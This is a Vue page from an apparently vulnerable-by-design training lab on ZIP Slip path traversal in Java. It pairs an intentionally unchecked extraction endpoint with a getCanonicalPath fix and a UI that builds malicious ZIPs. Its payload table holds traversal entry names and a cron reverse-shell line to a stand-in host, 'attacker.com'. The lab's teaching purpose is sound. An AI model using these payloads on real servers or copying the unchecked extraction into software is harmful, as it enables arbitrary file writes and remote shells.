<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">ZIP Slip 漏洞（恶意压缩包路径穿越）</div>
      <div class="body-div">
        <el-tabs v-model="activeName">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              ZIP Slip 是一种文件归档提取漏洞，由 Snyk 安全团队在 2018 年公开披露。
              攻击者构造一个包含 <strong>路径穿越序列</strong>（如 <code>../../</code>）的 ZIP 文件，
              当服务端解压时直接使用 <code>zipEntry.getName()</code> 拼接目标路径而不做校验，
              恶意文件会被写入到解压目录之外的任意位置。
              <br /><br />
              <span style="color: red;">攻击原理：</span>
              <br />
              1. 攻击者构造恶意 ZIP 文件，其中包含条目名为 <code>../../../tmp/evil.txt</code> 的文件
              <br />
              2. 服务端用 <code>new File(extractDir, entry.getName())</code> 拼接解压目标路径
              <br />
              3. 由于 <code>entry.getName()</code> 包含 <code>../</code>，最终路径超出了解压基目录
              <br />
              4. 文件被写入到 <code>/tmp/evil.txt</code> 等任意位置
              <br />
              5. 攻击者可借此覆盖配置文件、写入 webshell、替换可执行文件等
              <br /><br />
              <span style="color: green;">本实验使用 Java 标准库 <code>java.util.zip</code> 处理 ZIP 文件。</span>
              前端纯 JavaScript 构造包含路径穿越条目的恶意 ZIP 文件，上传至后端解压，演示漏洞触发与安全防御效果。
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              ZIP Slip 可导致服务端任意文件写入，是供应链安全和文件处理类漏洞的典型代表：
              <br /><br />
              <span style="color: red;">主要危害：</span>
              <br />
              &bull; <strong>任意文件覆盖</strong>：覆盖 <code>application.yml</code>、<code>.bashrc</code>、<code>crontab</code> 等关键配置文件
              <br />
              &bull; <strong>写入 Webshell</strong>：在 Web 目录中写入 JSP/PHP 等恶意脚本，获取 RCE
              <br />
              &bull; <strong>替换可执行文件</strong>：替换系统命令或定时任务脚本
              <br />
              &bull; <strong>覆盖 SSH 授权密钥</strong>：写入 <code>~/.ssh/authorized_keys</code> 实现无密码登录
              <br />
              &bull; <strong>供应链投毒</strong>：恶意依赖包内含 ZIP Slip payload，影响所有使用者
              <br /><br />
              <span style="color: red;">真实案例：</span>
              <br />
              &bull; CVE-2018-1002200：Apache Commons Compress（Java 最常用的压缩库之一）
              <br />
              &bull; CVE-2018-16131：Swagger-codegen 自动代码生成工具
              <br />
              &bull; Snyk 在 2018 年一次性披露了超过 1000 个受 ZIP Slip 影响的项目
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              <span style="color: red;">【必须】解压前校验每个条目的规范化路径</span>
              <br />
              使用 <code>getCanonicalPath()</code> 将解压目标路径规范化（消除 <code>../</code>），
              然后检查规范化后的路径是否仍然以目标解压目录开头。不满足则拒绝解压。
              <br /><br />
              <span style="color: red;">【必须】禁止条目名包含路径穿越序列</span>
              <br />
              额外检查 <code>entry.getName()</code> 是否包含 <code>../</code> 或以 <code>/</code> 开头（绝对路径），
              作为双重保险。
              <br /><br />
              <span style="color: red;">【建议】限制解压文件大小和数量</span>
              <br />
              防止 ZIP 炸弹（Zip Bomb），限制单个文件大小、总解压大小和最大文件数量。
              <br /><br />
              <span style="color: red;">【建议】使用安全的归档处理库</span>
              <br />
              Apache Commons Compress 1.18+ 已修复 ZIP Slip 漏洞，推荐使用最新版本。
              也可考虑使用内置安全校验的解压工具。
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://security.snyk.io/research/zip-slip-vulnerability" target="_blank" style="text-decoration: underline;">《Snyk - Zip Slip Vulnerability》</a>：Snyk 安全团队的原始披露报告。<br />
              <a href="https://github.com/snyk/zip-slip-vulnerability" target="_blank" style="text-decoration: underline;">《GitHub - zip-slip-vulnerability》</a>：Snyk 开源的 ZIP Slip 多语言 POC 和受影响项目列表。<br />
              <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" style="text-decoration: underline;">《OWASP - Unrestricted File Upload》</a>：文件上传与处理类漏洞的综合指南。<br />
              <a href="https://portswigger.net/web-security/file-upload" target="_blank" style="text-decoration: underline;">《PortSwigger - File Upload Vulnerabilities》</a>：PortSwigger 关于文件上传安全的研究。
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>

    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - 解压时不校验条目路径
              <el-button type="danger" round size="mini" @click="showVulnDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * 漏洞版：解压 ZIP 时不校验条目路径
 * zipEntry.getName() 可能包含 ../../ 路径穿越序列
 * 直接用 new File(extractDir, entry.getName()) 拼接
 * 导致文件被写到解压目录之外的任意位置
 */
@PostMapping("/vuln")
public Result vuln(@RequestParam("file") MultipartFile file) {
    ZipInputStream zis = new ZipInputStream(file.getInputStream());
    ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        // ❌ 关键漏洞点：直接使用 entry.getName()，不做任何校验
        File outputFile = new File(EXTRACT_DIR, entry.getName());
        outputFile.getParentFile().mkdirs();
        FileOutputStream fos = new FileOutputStream(outputFile);
        // ... 写入文件内容 ...
    }
    return Result.success(extractedFiles);
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码 - getCanonicalPath() 路径校验
              <el-button type="success" round size="mini" @click="showSecDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">/**
 * 安全版：解压前用 getCanonicalPath() 校验路径
 * 规范化路径消除 ../../ 后，检查是否仍在目标目录内
 * 如果超出目录范围，立即拒绝解压并返回拦截详情
 */
@PostMapping("/sec")
public Result sec(@RequestParam("file") MultipartFile file) {
    File destDir = new File(EXTRACT_DIR);
    String destDirPath = destDir.getCanonicalPath();
    ZipInputStream zis = new ZipInputStream(file.getInputStream());
    ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        File outputFile = new File(destDir, entry.getName());
        String outputFilePath = outputFile.getCanonicalPath();
        // ✅ 安全校验：规范化路径后检查前缀
        if (!outputFilePath.startsWith(destDirPath + File.separator)) {
            result.put("blocked", true);
            result.put("blockReason", "检测到 ZIP Slip 攻击！"
                + "恶意条目: " + entry.getName()
                + " → 试图写入: " + outputFilePath);
            return Result.success(result); // 返回详情供前端展示
        }
        // ... 安全写入文件 ...
    }
    return Result.success(result);
}</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <!-- ============ 漏洞测试对话框 ============ -->
    <el-dialog title="ZIP Slip 漏洞测试（恶意压缩包路径穿越）" :visible.sync="vulnDialogVisible" class="center-dialog" width="85%">
      <div style="text-align: left; color: red; font-style: italic; margin-bottom: 15px;">
        <strong>两步操作说明：</strong><br>
        Step 1：选择场景后点击"生成并下载 ZIP"，浏览器会下载构造好的 ZIP 文件（可用压缩工具查看其中的文件条目名）<br>
        Step 2：点击"上传"按钮选择刚下载的 ZIP 文件上传到服务端，观察解压过程和实际写入路径
      </div>

      <el-form label-width="130px" class="demo-form-inline">
        <!-- Step 1: 构造并下载 ZIP -->
        <el-card shadow="hover" class="step-card">
          <div slot="header"><strong>Step 1：构造恶意 ZIP 并下载</strong></div>
          <el-form-item label="选择测试场景">
            <el-select v-model="vulnForm.selectedPayload" placeholder="选择 ZIP 文件类型" @change="updateVulnPayload" style="width: 100%;">
              <el-option label="✅ 正常 ZIP - 文件名: hello.txt（无穿越）" value="normal"></el-option>
            <el-option label="💀 恶意 ZIP - 穿越到 /tmp/evil.txt" value="tmp_evil"></el-option>
            <el-option label="💀 恶意 ZIP - 穿越写入计划任务反弹 Shell" value="deep_traversal"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="ZIP 条目名">
          <el-input v-model="vulnForm.entryName" placeholder="ZIP 文件内的条目名（文件路径）"></el-input>
        </el-form-item>
        <el-form-item label="文件内容">
          <el-input v-model="vulnForm.fileContent" type="textarea" :rows="2" placeholder="写入文件的内容"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="warning" @click="downloadZip('vuln')" :disabled="!vulnForm.entryName">
            生成并下载 ZIP 文件
            </el-button>
            <span v-if="vulnForm.downloaded" style="color: #67c23a; margin-left: 10px;">
              已下载: {{ vulnForm.downloadFileName }}
            </span>
          </el-form-item>
        </el-card>

        <!-- Step 2: 上传 ZIP -->
        <el-card shadow="hover" class="step-card">
          <div slot="header"><strong>Step 2：上传 ZIP 并观察解压过程</strong></div>
          <el-form-item label="选择 ZIP 文件">
            <el-upload
              ref="vulnUpload"
              action=""
              :auto-upload="false"
              :on-change="(f) => handleFileChange(f, 'vulnForm')"
              :on-remove="() => handleFileRemove('vulnForm')"
              accept=".zip"
              :file-list="vulnForm.fileList">
              <el-button type="primary" size="small">选择文件</el-button>
              <span slot="tip" class="upload-tip">  请选择 Step 1 下载的 ZIP 文件（可重新选择覆盖）</span>
            </el-upload>
          </el-form-item>
          <el-form-item>
            <el-button type="danger" @click="uploadAndExtract('vuln')" :loading="vulnForm.loading" :disabled="!vulnForm.uploadFile">
              上传到漏洞接口解压
            </el-button>
          </el-form-item>
        </el-card>
      </el-form>

      <!-- 解压结果展示 -->
      <div v-if="vulnForm.result" class="result-display">
        <h4>服务端解压过程详情：</h4>

        <div class="detail-section">
          <div class="detail-label">原始 ZIP 保存路径：</div>
          <code class="detail-value">{{ vulnForm.result.originalZip }}</code>
        </div>

        <div class="detail-section">
          <div class="detail-label">解压目标目录：</div>
          <code class="detail-value">{{ vulnForm.result.extractDir }}</code>
        </div>

        <div class="detail-section">
          <div class="detail-label">ZIP 条目解压详情：</div>
          <el-table :data="vulnForm.result.entries" border size="small" style="width: 100%; margin-top: 8px;">
            <el-table-column prop="entryName" label="ZIP 条目名 (entry.getName())" min-width="200">
              <template slot-scope="scope">
                <code :style="{ color: scope.row.pathTraversal === 'true' ? '#f56c6c' : '#67c23a' }">
                  {{ scope.row.entryName }}
                </code>
              </template>
            </el-table-column>
            <el-table-column prop="resolvedPath" label="目标解压路径" min-width="280">
              <template slot-scope="scope">
                <code :style="{ color: scope.row.pathTraversal === 'true' ? '#f56c6c' : '#303133' }">
                  {{ scope.row.resolvedPath }}
                </code>
              </template>
            </el-table-column>
            <el-table-column label="路径穿越" width="120" align="center">
              <template slot-scope="scope">
                <el-tag :type="scope.row.pathTraversal === 'true' ? 'danger' : 'success'" size="small">
                  {{ scope.row.pathTraversal === 'true' ? '成功' : '否' }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="type" label="类型" width="80" align="center"></el-table-column>
            <el-table-column prop="size" label="大小" width="100" align="center"></el-table-column>
          </el-table>
        </div>

        <div v-if="vulnForm.hasTraversal && vulnForm.selectedPayload === 'deep_traversal'" style="margin-top: 12px;">
          <div class="result-box result-danger">
            <pre>⚠️ ZIP Slip 攻击成功！文件已被写入到解压目录之外！
攻击者可借此覆盖任意文件，实现远程代码执行。</pre>
          </div>
          <div class="result-box result-note" style="margin-top: 12px;">
            <pre>📋 计划任务反弹 Shell 场景说明：

ZIP Slip 已成功将恶意计划任务文件写入 /etc/cron.d/backdoor。
在真实的 Linux 服务器上，cron 守护进程会自动读取 /etc/cron.d/ 目录下的文件并按计划执行，
攻击者的反弹 Shell 命令将每分钟自动执行一次。

⚠️ 当前 Docker 容器中未安装/启动 cron 服务，因此计划任务不会被自动触发。
但这不影响 ZIP Slip 漏洞本身的验证——关键在于文件已被成功写入到解压目录之外。

验证方式：进入容器执行 cat /etc/cron.d/backdoor 查看写入的恶意内容。</pre>
          </div>
        </div>
        <div v-else-if="vulnForm.hasTraversal" class="result-box result-danger" style="margin-top: 12px;">
          <pre>⚠️ ZIP Slip 攻击成功！文件已被写入到解压目录之外！
攻击者可借此覆盖任意文件，实现远程代码执行。</pre>
        </div>
        <div v-else class="result-box result-success" style="margin-top: 12px;">
          <pre>✅ 所有文件都在解压目录内，无路径穿越。</pre>
        </div>
      </div>
    </el-dialog>

    <!-- ============ 安全测试对话框 ============ -->
    <el-dialog title="ZIP Slip 安全测试（getCanonicalPath 路径校验）" :visible.sync="secDialogVisible" class="center-dialog" width="85%">
      <div style="text-align: left; color: red; font-style: italic; margin-bottom: 15px;">
        安全版会对每个 ZIP 条目执行路径校验：<br>
        - 使用 <code>getCanonicalPath()</code> 规范化路径（消除 <code>../</code>）<br>
        - 检查规范化后的路径是否仍以解压目录为前缀<br>
        - 如果发现路径穿越，立即拒绝并返回详细的拦截信息
      </div>

      <el-form label-width="130px" class="demo-form-inline">
        <el-card shadow="hover" class="step-card">
          <div slot="header"><strong>Step 1：构造恶意 ZIP 并下载</strong></div>
          <el-form-item label="选择测试场景">
            <el-select v-model="secForm.selectedPayload" placeholder="选择 ZIP 文件类型" @change="updateSecPayload" style="width: 100%;">
              <el-option label="✅ 正常 ZIP - 文件名: hello.txt（无穿越）" value="normal"></el-option>
            <el-option label="🛡️ 恶意 ZIP - 穿越到 /tmp/evil.txt（会被拦截）" value="tmp_evil"></el-option>
            <el-option label="🛡️ 恶意 ZIP - 深度穿越到 /etc/cron.d/（会被拦截）" value="deep_traversal"></el-option>
            </el-select>
          </el-form-item>
          <el-form-item label="ZIP 条目名">
            <el-input v-model="secForm.entryName" placeholder="ZIP 文件内的条目名（文件路径）"></el-input>
          </el-form-item>
          <el-form-item label="文件内容">
            <el-input v-model="secForm.fileContent" type="textarea" :rows="2" placeholder="写入文件的内容"></el-input>
          </el-form-item>
          <el-form-item>
            <el-button type="warning" @click="downloadZip('sec')" :disabled="!secForm.entryName">
              生成并下载 ZIP 文件
            </el-button>
            <span v-if="secForm.downloaded" style="color: #67c23a; margin-left: 10px;">
              已下载: {{ secForm.downloadFileName }}
            </span>
          </el-form-item>
        </el-card>

        <el-card shadow="hover" class="step-card">
          <div slot="header"><strong>Step 2：上传 ZIP 并观察安全防御</strong></div>
          <el-form-item label="选择 ZIP 文件">
            <el-upload
              ref="secUpload"
              action=""
              :auto-upload="false"
              :on-change="(f) => handleFileChange(f, 'secForm')"
              :on-remove="() => handleFileRemove('secForm')"
              accept=".zip"
              :file-list="secForm.fileList">
              <el-button type="primary" size="small">选择文件</el-button>
              <span slot="tip" class="upload-tip">  请选择 Step 1 下载的 ZIP 文件（可重新选择覆盖）</span>
            </el-upload>
          </el-form-item>
          <el-form-item>
            <el-button type="success" @click="uploadAndExtract('sec')" :loading="secForm.loading" :disabled="!secForm.uploadFile">
              上传到安全接口解压
            </el-button>
          </el-form-item>
        </el-card>
      </el-form>

      <div v-if="secForm.result" class="result-display">
        <h4>服务端解压过程详情：</h4>

        <div class="detail-section">
          <div class="detail-label">原始 ZIP 保存路径：</div>
          <code class="detail-value">{{ secForm.result.originalZip }}</code>
        </div>

        <div class="detail-section">
          <div class="detail-label">解压目标目录：</div>
          <code class="detail-value">{{ secForm.result.extractDir }}</code>
        </div>

        <div class="detail-section">
          <div class="detail-label">ZIP 条目解压详情：</div>
          <el-table :data="secForm.result.entries" border size="small" style="width: 100%; margin-top: 8px;">
            <el-table-column prop="entryName" label="ZIP 条目名 (entry.getName())" min-width="200">
              <template slot-scope="scope">
                <code :style="{ color: scope.row.pathTraversal === 'true' ? '#f56c6c' : '#67c23a' }">
                  {{ scope.row.entryName }}
                </code>
              </template>
            </el-table-column>
            <el-table-column prop="resolvedPath" label="目标解压路径" min-width="280">
              <template slot-scope="scope">
                <code :style="{ color: scope.row.pathTraversal === 'true' ? '#f56c6c' : '#303133' }">
                  {{ scope.row.resolvedPath }}
                </code>
              </template>
            </el-table-column>
            <el-table-column label="路径穿越" width="120" align="center">
              <template slot-scope="scope">
                <el-tag :type="scope.row.pathTraversal === 'true' ? 'warning' : 'success'" size="small">
                  {{ scope.row.pathTraversal === 'true' ? '失败（已拦截）' : '否' }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="type" label="类型" width="80" align="center"></el-table-column>
            <el-table-column prop="size" label="大小" width="100" align="center"></el-table-column>
          </el-table>
        </div>

        <div v-if="secForm.result.blocked" class="result-box result-intercepted" style="margin-top: 12px;">
          <pre>🛡️ ZIP Slip 攻击被拦截！

{{ secForm.result.blockReason }}

安全版通过 getCanonicalPath() 规范化路径后检查前缀，成功阻止了路径穿越攻击。</pre>
        </div>
        <div v-else class="result-box result-success" style="margin-top: 12px;">
          <pre>✅ 所有文件安全解压到允许的目录内。</pre>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { uploadZip, buildMaliciousZip, buildNormalZip } from '@/api/zipslip'

const ZIP_PAYLOADS = {
  normal: { entryName: 'hello.txt', content: 'Hello, this is a normal file.', fileName: 'normal.zip' },
  tmp_evil: { entryName: '../../../../tmp/evil.txt', content: 'You have been hacked by ZIP Slip!', fileName: 'malicious_tmp_evil.zip' },
  deep_traversal: { entryName: '../../../../../etc/cron.d/backdoor', content: '* * * * * root /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1', fileName: 'malicious_deep_traversal.zip' }
}

const emptyForm = () => ({
  selectedPayload: '',
  entryName: '',
  fileContent: '',
  downloaded: false,
  downloadFileName: '',
  uploadFile: null,
  fileList: [],
  result: null,
  hasTraversal: false,
  loading: false
})

export default {
  data() {
    return {
      activeName: 'first',
      vulnDialogVisible: false,
      secDialogVisible: false,
      vulnForm: emptyForm(),
      secForm: emptyForm()
    }
  },
  methods: {
    showVulnDialog() {
      this.vulnDialogVisible = true
      this.vulnForm = emptyForm()
    },
    showSecDialog() {
      this.secDialogVisible = true
      this.secForm = emptyForm()
    },
    updateVulnPayload() {
      const p = ZIP_PAYLOADS[this.vulnForm.selectedPayload]
      if (p) {
        this.vulnForm.entryName = p.entryName
        this.vulnForm.fileContent = p.content
        this.vulnForm.downloaded = false
        this.vulnForm.uploadFile = null
        this.vulnForm.fileList = []
        this.vulnForm.result = null
      }
    },
    updateSecPayload() {
      const p = ZIP_PAYLOADS[this.secForm.selectedPayload]
      if (p) {
        this.secForm.entryName = p.entryName
        this.secForm.fileContent = p.content
        this.secForm.downloaded = false
        this.secForm.uploadFile = null
        this.secForm.fileList = []
        this.secForm.result = null
      }
    },
    downloadZip(scene) {
      const form = scene === 'vuln' ? this.vulnForm : this.secForm
      const payload = ZIP_PAYLOADS[form.selectedPayload]
      const zipFile = form.entryName.includes('../')
        ? buildMaliciousZip(form.entryName, form.fileContent || 'pwned')
        : buildNormalZip(form.entryName, form.fileContent || 'hello')

      const fileName = payload ? payload.fileName : 'generated.zip'
      const url = URL.createObjectURL(zipFile)
      const a = document.createElement('a')
      a.href = url
      a.download = fileName
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)

      form.downloaded = true
      form.downloadFileName = fileName
      this.$message.success('ZIP 文件已下载: ' + fileName)
    },
    handleFileChange(file, formKey) {
      this[formKey].uploadFile = file.raw
      this[formKey].fileList = [file]
    },
    handleFileRemove(formKey) {
      this[formKey].uploadFile = null
      this[formKey].fileList = []
    },
    async uploadAndExtract(scene) {
      const form = scene === 'vuln' ? this.vulnForm : this.secForm
      if (!form.uploadFile) {
        this.$message.warning('请先选择要上传的 ZIP 文件')
        return
      }
      form.loading = true
      form.result = null
      try {
        const res = await uploadZip(scene, form.uploadFile)
        if (res.code === 0) {
          form.result = res.data
          if (scene === 'vuln') {
            form.hasTraversal = (res.data.entries || []).some(e => e.pathTraversal === 'true')
          }
        } else {
          this.$message.error('服务端返回错误: ' + (res.data || res.msg))
        }
      } catch (e) {
        this.$message.error('请求失败: ' + (e.message || e))
      } finally {
        form.loading = false
      }
    }
  }
}
</script>

<style scoped>
.root-div {
  height: 100%;
}

.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}

.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  justify-content: center;
  align-items: center;
  border-bottom: 1px solid #ccc;
}

.body-div {
  padding: 10px;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
  font-size: 14px;
}

.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}

.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}

pre code {
  font-size: 12px;
}

.el-row {
  margin-bottom: 20px;
}

.el-row:last-child {
  margin-bottom: 0;
}

.el-col {
  border-radius: 4px;
}

.bg-purple {
  background: #d3dce6;
}

.grid-content {
  border-radius: 4px;
  height: 100%;
  padding: 10px;
}

.grid-flex {
  display: flex;
  align-items: stretch;
}

.center-dialog {
  text-align: center;
  margin: 0 auto;
}

.demo-form-inline {
  text-align: left;
}

.step-card {
  margin-bottom: 16px;
}

.upload-tip {
  font-size: 12px;
  color: #909399;
}

.result-display {
  margin-top: 20px;
  text-align: left;
}

.result-display h4 {
  margin-top: 0;
  margin-bottom: 16px;
  color: #303133;
  font-size: 16px;
  font-weight: bold;
}

.detail-section {
  margin-bottom: 12px;
}

.detail-label {
  font-size: 13px;
  color: #606266;
  margin-bottom: 4px;
  font-weight: bold;
}

.detail-value {
  display: inline-block;
  background-color: #f5f7fa;
  padding: 4px 10px;
  border-radius: 3px;
  font-size: 13px;
  color: #303133;
  border: 1px solid #e4e7ed;
}

.result-box {
  border-radius: 4px;
  padding: 16px;
  font-size: 13px;
  line-height: 1.6;
}

.result-box pre {
  margin: 0;
  white-space: pre-wrap;
  word-break: break-all;
}

.result-danger {
  background-color: #fef0f0;
  border: 1px solid #fbc4c4;
  color: #f56c6c;
}

.result-success {
  background-color: #f0f9eb;
  border: 1px solid #c2e7b0;
  color: #67c23a;
}

.result-intercepted {
  background-color: #ecf5ff;
  border: 1px solid #b3d8ff;
  color: #409EFF;
}

.result-note {
  background-color: #fdf6ec;
  border: 1px solid #f5dab1;
  color: #e6a23c;
}
</style>
